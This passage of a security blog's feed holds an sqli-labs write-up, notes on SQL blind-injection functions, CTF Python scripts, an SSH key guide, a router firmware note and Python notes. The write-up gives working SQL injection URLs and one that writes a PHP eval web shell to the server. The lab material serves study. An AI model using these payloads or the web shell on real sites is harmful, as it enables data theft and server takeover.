&lt;li&gt;&lt;p&gt;序列化就是使用&lt;code&gt;serialize()&lt;/code&gt;将对象的用字符串的方式进行表示，反序列化是使用&lt;code&gt;unserialize()&lt;/code&gt;将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;序列化的对象可以是&lt;code&gt;class&lt;/code&gt;也可以是&lt;code&gt;Array,string&lt;/code&gt;等其他对象。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web" scheme="https://dayu.ink/categories/Web/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="PHP" scheme="https://dayu.ink/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs writeup</title>
    <link href="https://dayu.ink/sqli-labs-writeup.html"/>
    <id>https://dayu.ink/sqli-labs-writeup.html</id>
    <published>2017-10-10T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>sqli-labs writeup</p><a id="more"></a><hr><h3 id="less-1-4"><a href="#less-1-4" class="headerlink" title="less_1-4"></a>less_1-4</h3><ol><li>加一个’，找到注入点：<code>http://127.0.0.1/Less-1/?id=1&#39;</code></li><li>猜列数：<code>http://127.0.0.1/Less-1/?id=0&#39; order by 4--+</code></li><li>union查询：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,3--+</code></li><li>爆库名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></li><li>爆表名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></li><li>爆字段名：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;--+</code></li><li>爆数据：<code>http://127.0.0.1/Less-1/?id=0&#39; union select 1,2,concat_ws(char(32,58,32),id,email_id) from emails--+</code></li></ol><h3 id="less-5-6"><a href="#less-5-6" class="headerlink" title="less_5-6"></a>less_5-6</h3><ol><li><p>爆security表名：    <code>http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+</code></p></li><li><p>爆emails列名：<code>http://127.0.0.1/Less-5/?id=1&#39; union select count(*), 1, concat(0x7e, (select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x656D61696C73 limit 0, 1), 0x7e, floor(rand()*2)) as q from information_schema.tables group by q--+</code></p></li></ol><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less_7"></a>Less_7</h3><ul><li>写文件：<code>http://127.0.0.1/Less-7/?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[dayu]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;--+</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sqli-labs writeup&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="https://dayu.ink/categories/Web/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="writeup" scheme="https://dayu.ink/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Sql盲注常用函数回顾</title>
    <link href="https://dayu.ink/Sql-blind-basic-function-review.html"/>
    <id>https://dayu.ink/Sql-blind-basic-function-review.html</id>
    <published>2017-10-05T08:08:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>CONCAT(str1,str2,…)<br>返回来自于参数连结的字符串。如果任何参数是NULL，返回NULL。可以有超过2个的参数。一个数字参数被变换为等价的字符串形式。</p></li><li><p>ASCII(str)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。</p></li><li><p>ORD(str)<br>ORD()函数同ascii()，将字符转为ascii值</p></li></ul><a id="more"></a><ul><li><p>SUBSTR(str,pos)<br>就是从pos开始的位置，一直截取到最后。<br>SUBSTR(str,pos,len)<br>pos开始的位置，截取len个字符(空白也算字符)。</p></li><li><p>mid()<br>截取字符串一部分<br>MID(column_name,start,length)<br>column_name:必需.要提取字符的字段<br>start:必需.规定开始位置（起始值是 1）<br>length:可选.要返回的字符数.如果省略,则 MID() 函数返回剩余文本<br>MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符<br>MID((sql语句),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入</p></li><li><p>LEFT(str,len)<br>返回字符串str的最左面len个字符。</p></li><li><p>RIGHT(str,len)<br>返回字符串str的最右面len个字符。</p></li><li><p>ISNULL(expr) 的用法：<br>如expr 为null，那么isnull() 的返回值为 1，否则返回值为 0</p></li><li><p>IFNULL(expr1,expr2)的用法：<br>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2</p></li><li><p>NULLIF(expr1,expr2) 的用法：<br>如果expr1=expr2成立，那么返回值为NULL，否则返回值为expr1</p></li><li><p>regexp正则注入<br>用法介绍：select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。<br>第二位可以用select user() regexp ‘^ro’来进行。<br>当正确的时候显示结果为1，不正确的时候显示结果为0。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;CONCAT(str1,str2,…)&lt;br&gt;返回来自于参数连结的字符串。如果任何参数是NULL，返回NULL。可以有超过2个的参数。一个数字参数被变换为等价的字符串形式。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ASCII(str)&lt;br&gt;返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ORD(str)&lt;br&gt;ORD()函数同ascii()，将字符转为ascii值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web" scheme="https://dayu.ink/categories/Web/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="Sql" scheme="https://dayu.ink/tags/Sql/"/>
    
  </entry>
  
  <entry>
    <title>类Unix/Linux系统下使用ssh-keygen设置SSH无密码登录</title>
    <link href="https://dayu.ink/SSH-Keygen.html"/>
    <id>https://dayu.ink/SSH-Keygen.html</id>
    <published>2017-09-30T13:16:39.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>..<br><a id="more"></a></p><h4 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a机器(Kali)：192.168.43.31</span><br><span class="line">b机器(Ubuntu)：192.168.43.30</span><br></pre></td></tr></table></figure><h4 id="二、用ssh-keygen创建密钥"><a href="#二、用ssh-keygen创建密钥" class="headerlink" title="二、用ssh-keygen创建密钥"></a>二、用ssh-keygen创建密钥</h4><p>在kali上执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p><p><img src="https://oss.dayu.ink/ssh-keygen/ssh1.png?x-oss-process=style/blog" alt><br>-t 指定算法</p><p>会生成这两个文件<br><img src="https://oss.dayu.ink/ssh-keygen/ssh2.png?x-oss-process=style/blog" alt><br>其中id_rsa为私钥，放在管理端，id_rsa.pub为公钥，放在被管理端。</p><h4 id="三、被管理端配置"><a href="#三、被管理端配置" class="headerlink" title="三、被管理端配置"></a>三、被管理端配置</h4><p>将公钥文件id_rsa.pub，复制到被管理机器ubuntu下的.ssh目录下（先确保存在这个目录）<br>在ubuntu下执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">设置authorized_keys权限</span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line">设置.ssh目录权限</span><br><span class="line">chmod 700 .ssh</span><br></pre></td></tr></table></figure></p><h4 id="四、连接测试"><a href="#四、连接测试" class="headerlink" title="四、连接测试"></a>四、连接测试</h4><p><img src="https://oss.dayu.ink/ssh-keygen/ssh3.png?x-oss-process=style/blog" alt><br>无密码连接成功</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;..&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://dayu.ink/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://dayu.ink/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>今天写的三道CTF题的Python脚本</title>
    <link href="https://dayu.ink/ThreeCTFquestionsOnThePythonScript.html"/>
    <id>https://dayu.ink/ThreeCTFquestionsOnThePythonScript.html</id>
    <published>2017-09-21T11:58:30.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-快速口算"><a href="#0x01-快速口算" class="headerlink" title="0x01 快速口算"></a>0x01 快速口算</h3><p>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？<br>题目地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php</span><br></pre></td></tr></table></figure></p><p>代码：<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span></span><br><span class="line">req = urllib.request.Request(url)</span><br><span class="line">req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=dc45c388824b53d0bc61b03b153b4813"</span>)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line">html = response.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">a = html.find(<span class="string">'&lt;br/&gt;'</span>)</span><br><span class="line">b = html.find(<span class="string">'='</span>,a)</span><br><span class="line">res= eval(html[a+<span class="number">7</span>:b])</span><br><span class="line">params = &#123;<span class="string">'v'</span>:res&#125;;</span><br><span class="line">params = urllib.parse.urlencode(params).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">response = urllib.request.urlopen(req, params)</span><br><span class="line"><span class="keyword">print</span> (response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><h3 id="0x02-百米"><a href="#0x02-百米" class="headerlink" title="0x02 百米"></a>0x02 百米</h3><p>100米你能跑多快？ 预备，跑！<br>题目地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/jia/</span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">'http://ctf5.shiyanbar.com/jia/index.php'</span></span><br><span class="line">req = urllib.request.Request(url)</span><br><span class="line">req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=09jdaa5u9n5u481iujpd56i7u6; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1505970002,1505987900; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1505991328; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*80725%2CnickName%3A%E5%A4%A7%E5%AE%87"</span>)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line">html = response.read().decode(<span class="string">'gbk'</span>)</span><br><span class="line">a = html.find(<span class="string">'my_expr'</span>)</span><br><span class="line">b = html.find(<span class="string">'&lt;/div&gt;'</span>,a)</span><br><span class="line">str = html[a+<span class="number">9</span>:b<span class="number">-1</span>]</span><br><span class="line">str = str.replace(<span class="string">"x"</span>,<span class="string">"*"</span>)</span><br><span class="line">str = eval(str)</span><br><span class="line">params = &#123;<span class="string">'pass_key'</span>:str&#125;;</span><br><span class="line">params = urllib.parse.urlencode(params).encode(<span class="string">'gbk'</span>)</span><br><span class="line">response = urllib.request.urlopen(req, params)</span><br><span class="line"><span class="keyword">print</span> (response.read().decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><h3 id="0x03-速度爆破"><a href="#0x03-速度爆破" class="headerlink" title="0x03 速度爆破"></a>0x03 速度爆破</h3><p>看你编程能力怎么样，2秒钟提交应该都会吧。So easy, come on, baby!<br>格式：CTF{}<br>题目地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/jia/</span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://ctf5.shiyanbar.com/ppc/sd.php'</span></span><br><span class="line">    req = urllib.request.Request(url)</span><br><span class="line">    req.add_header(<span class="string">"Cookie"</span>,<span class="string">"PHPSESSID=xxxxxxxxxx"</span>)</span><br><span class="line">    response = urllib.request.urlopen(req)</span><br><span class="line">    html = response.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    a = html.find(<span class="string">'color:red"&gt;'</span>)</span><br><span class="line">    b = html.find(<span class="string">'&lt;/div&gt;'</span>,a)</span><br><span class="line">    res = html[a+<span class="number">11</span>:b]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100001</span>):</span><br><span class="line">        i = str(i)</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        m.update(i.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        fin = m.hexdigest()</span><br><span class="line">        fin = hashlib.sha1(fin.encode(<span class="string">"utf-8"</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(fin == res):</span><br><span class="line">            params = &#123;<span class="string">'inputNumber'</span>: i&#125;;</span><br><span class="line">            params = urllib.parse.urlencode(params).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            response = urllib.request.urlopen(req, params)</span><br><span class="line">            print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-快速口算&quot;&gt;&lt;a href=&quot;#0x01-快速口算&quot; class=&quot;headerlink&quot; title=&quot;0x01 快速口算&quot;&gt;&lt;/a&gt;0x01 快速口算&lt;/h3&gt;&lt;p&gt;小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？&lt;br&gt;题目地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;代码：&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://dayu.ink/categories/CTF/"/>
    
    
      <category term="Python" scheme="https://dayu.ink/tags/Python/"/>
    
      <category term="CTF" scheme="https://dayu.ink/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>小tip：trx文件修改-路由器固件的解包打包工具</title>
    <link href="https://dayu.ink/TrxModify.html"/>
    <id>https://dayu.ink/TrxModify.html</id>
    <published>2017-09-09T11:58:30.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>在通过ssh或telnet不能修改文件时，可以尝试修改固件重新刷入路由器。<br><a id="more"></a></p><h3 id="0x01背景"><a href="#0x01背景" class="headerlink" title="0x01背景"></a>0x01背景</h3><p>今天一个老哥丢给我了一个斐讯K2，已经刷了恩山hiboy的华硕固件，pppoe拨号处密码不能填写特殊字符，但是他的密码有一个特殊字符 而且不能改密码，这就很尴尬了，然后开始了一波探索。。</p><p><img src="https://oss.dayu.ink/trx-edit/1.png?x-oss-process=style/blog" alt><br><img src="https://oss.dayu.ink/trx-edit/2.png?x-oss-process=style/blog" alt></p><h3 id="0x02修改js绕过"><a href="#0x02修改js绕过" class="headerlink" title="0x02修改js绕过"></a>0x02修改js绕过</h3><p>既然不让提交，试试绕过前端限制把。<br>点应用本页面设置后，会跳到applyRule()这个js。<br><img src="https://oss.dayu.ink/trx-edit/3.png?x-oss-process=style/blog" alt><br>然后找到前端限制问题出在validForm()上。<br><img src="https://oss.dayu.ink/trx-edit/4.png?x-oss-process=style/blog" alt><br>只要不是string就会返回false，那么把这一行删掉不就可以了嘛。<br><img src="https://oss.dayu.ink/trx-edit/5.png?x-oss-process=style/blog" alt><br>ssh连接之<br><img src="https://oss.dayu.ink/trx-edit/6.png?x-oss-process=style/blog" alt><br><img src="https://oss.dayu.ink/trx-edit/7.png?x-oss-process=style/blog" alt><br>找到www目录，里面就有Advanced_WAN_Content.asp这个文件，修改后发现问题。。根本改不了。。<br>chmod  winscp一顿尝试后，都无法修改www里面的文件，查了查好像是因为磁盘太小的原因，但是mnt目录可写啊，不知道为什么，反正改不了。。这个以后再研究。<br>看了看路由器感觉这个地方似乎可以，先备份然后改一下备份文件再传回去应该差不多把，发现下载下来的cfg文件记事本打开乱码，放弃之。<br><img src="https://oss.dayu.ink/trx-edit/8.png?x-oss-process=style/blog" alt>想想配置的文件会不会在磁盘里，找了找也没有眉目。</p><h3 id="0x03trx重新打包固件"><a href="#0x03trx重新打包固件" class="headerlink" title="0x03trx重新打包固件"></a>0x03trx重新打包固件</h3><p>进入正题。快要放弃的时候想到，能不能改一下包。经过一波搜索，在恩山论坛@yingdaoli的帖子看到了这个软件，在linux下root权限可使用，我发到了微云分享：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://share.weiyun.com/c3cae319b0bd68c7eb9d23a8a4ac7789</span><br></pre></td></tr></table></figure></p><p>./modify.sh e rom.trx 是解包<br>解包后不要忘了给squashfs-root文件夹读写权限<br>./modify.sh c newrom.trx 是打包，会自动打包squashfs-root文件夹并且命名为newrom.trx<br><img src="https://oss.dayu.ink/trx-edit/9.png?x-oss-process=style/blog" alt><br>解包后修改Advanced_WAN_Content.asp，重新打包，刷入路由器，成功！<br>没有什么技术含量，但是记录一下这个有趣的过程。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在通过ssh或telnet不能修改文件时，可以尝试修改固件重新刷入路由器。&lt;br&gt;
    
    </summary>
    
      <category term="Others" scheme="https://dayu.ink/categories/Others/"/>
    
    
      <category term="路由器" scheme="https://dayu.ink/tags/router/"/>
    
      <category term="工具" scheme="https://dayu.ink/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>Python基础学习笔记(二)</title>
    <link href="https://dayu.ink/PythonBasicStudyNotes2.html"/>
    <id>https://dayu.ink/PythonBasicStudyNotes2.html</id>
    <published>2017-08-28T01:59:09.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="四、Python异常处理"><a href="#四、Python异常处理" class="headerlink" title="四、Python异常处理"></a>四、Python异常处理</h2><h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><ul><li>异常处理就是为了防止程序运行异常时候结束掉了整个程序，比如你访问一个网站，访问不通了，这种情况出现异常导致程序被结束你肯定不希望，所以用try…except..进行捕获异常，对异常进行处理，目的就是不想在异常发生时结束了程序，所以需要在try中捕获。当我们认为某些代码可能会出错时，就可以用try来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即except语句块， 执行完except后，如果有ﬁnally语句块，则执行ﬁnally语句块。</li></ul><h3 id="0x02-格式"><a href="#0x02-格式" class="headerlink" title="0x02 格式"></a>0x02 格式</h3><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">fh = open(<span class="string">"testfile"</span>, <span class="string">"w"</span>)</span><br><span class="line">fh.write(<span class="string">"这是一个测试文件，用于测试异常!!"</span>)</span><br><span class="line"><span class="keyword">except</span> IOError: </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Error: 没有找到文件或读取文件失败"</span> </span><br><span class="line"><span class="keyword">else</span>:              <span class="comment"># 如果try正常执行则执行else，如果发生异常则不执行else                         </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"内容写入文件成功"</span> </span><br><span class="line">fh.close() </span><br><span class="line"><span class="keyword">finally</span>: </span><br><span class="line"><span class="keyword">print</span> <span class="string">"不管你有没有找到，都输出我"</span></span><br></pre></td></tr></table></figure><h3 id="0x03-常用操作"><a href="#0x03-常用操作" class="headerlink" title="0x03 常用操作"></a>0x03 常用操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">&lt;语句&gt; </span><br><span class="line"><span class="keyword">except</span> BaseException,e <span class="comment">#前面是异常类型，后面是接受异常信息的变量参数，也可以使用except，然后什么也不加 </span></span><br><span class="line">&lt;发生异常执行语句&gt;</span><br><span class="line"><span class="keyword">except</span> (IOError,KeyError):</span><br><span class="line"><span class="keyword">print</span> sys.exc_info()    <span class="comment">#虽然能看到错误信息，但不能定位哪里行</span></span><br></pre></td></tr></table></figure><p>如果想知道except接什么的报错类型的话即先让他报错，然后看报的是什么错误，然后再在except后面加上对应的出错的异常类型。<br>备注:  以上方式try-except语句捕获所有发生的异常。但这不是一个很好的方式，我们不能通过该程序识别出具体的异常信息。因为它捕获所有的异常。 同时也不建议使用过多异常处理，虽然程序会减少报错，但如果在开发前报错其实是个好事，如果用太多异常，导致上线产品前会有很多要修改的隐藏bug，只不过可能被 try…except:pass给掩耳盗铃了。</p><h3 id="0x04-raise主动抛出异常"><a href="#0x04-raise主动抛出异常" class="headerlink" title="0x04 raise主动抛出异常"></a>0x04 raise主动抛出异常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">rasieException(<span class="string">"Invalid level!"</span>, level)             <span class="comment"># 触发异常后，后面的代码就不会再执行 </span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'主动抛出'</span></span><br></pre></td></tr></table></figure><p>ps:用户也可以自定义异常，但是要注意捕捉的异常名称要对应自定义的，比如exept “dota wrong”：。</p><h3 id="0x05-采用traceback模块查看异常"><a href="#0x05-采用traceback模块查看异常" class="headerlink" title="0x05 采用traceback模块查看异常"></a>0x05 采用traceback模块查看异常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">rasie</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">traceback.print_exc()  <span class="comment">#直接屏幕输出错误 </span></span><br><span class="line">traceback.print_exc(file=open(<span class="string">'tb.txt'</span>,<span class="string">'w+'</span>))   <span class="comment">#错误保存到文件中</span></span><br></pre></td></tr></table></figure><h3 id="0x06-断言"><a href="#0x06-断言" class="headerlink" title="0x06 断言"></a>0x06 断言</h3><p>assert和if语句类似，是用来检查一个条件，但不同的是如果它为真，就不做任何事。如果它为假，则会抛出AssertError异常。<br>即:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1</span> <span class="keyword">in</span> a  <span class="comment">#不执行任何事情</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">5</span> <span class="keyword">in</span> a  <span class="comment">#抛出AssertionError报错</span></span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="number">5</span>  <span class="keyword">in</span> a:</span><br><span class="line">rasie AssertionError</span><br></pre></td></tr></table></figure></p><p>用断言的场景:<br>1.断言应该使用在某种情况几乎不会发生的条件下（它是为了确保代码的正确性），目的是为了保证这种小概率事件发生时能尽早终止程序<br>2.异常应该使用在某些问题预见性的会出现，并且你可以创建自己的异常类</p><h2 id="五、Python输入输出"><a href="#五、Python输入输出" class="headerlink" title="五、Python输入输出"></a>五、Python输入输出</h2><h3 id="0x01-print输出"><a href="#0x01-print输出" class="headerlink" title="0x01 print输出"></a>0x01 print输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Example: </span><br><span class="line"><span class="keyword">print</span> <span class="string">'a=%d,b=%s'</span>%(a,b)                                        <span class="comment">#格式化输出 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'%.2f'</span> % a                                               <span class="comment">#保留两位小数或者round(a,2)   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'I am &#123;&#125;'</span>.format(<span class="string">'dota'</span>)                                 <span class="comment">#格式化输出</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"my name is &#123;name&#125;"</span>.format(name=name) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'I'</span>,<span class="string">'LOVE'</span>,<span class="string">'YOU'</span>                                         <span class="comment"># print会依次打印每个字符串，遇到逗号“,”会输出一个空格 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'I'</span>,                                                     <span 